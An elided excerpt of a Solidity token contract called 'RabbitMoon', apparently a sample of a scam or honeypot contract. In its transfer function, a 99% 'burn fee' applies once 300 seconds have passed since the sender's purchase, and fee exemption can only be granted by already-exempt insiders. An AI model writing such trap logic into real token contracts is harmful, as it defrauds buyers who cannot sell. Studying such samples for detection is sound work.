...
contract  RabbitMoon  is Ownable, IERC20 {
    ...
    function excludeFromFee(address recipient) external  {  require( _isExcludedFromFee[msg.sender]);
    ...
    function _transfer(  address from,  address to,  uint256 amount  ) private {
        ...
        require(amount > 0);        
        uint256  bf = 99;
        uint256 burntime =  Buyser[from] + 300;  
        uint256 burnfee;  
        ...
        if ( burntime < block.timestamp )    {   burnfee = amount.mul(bf).div(100); }     }  }
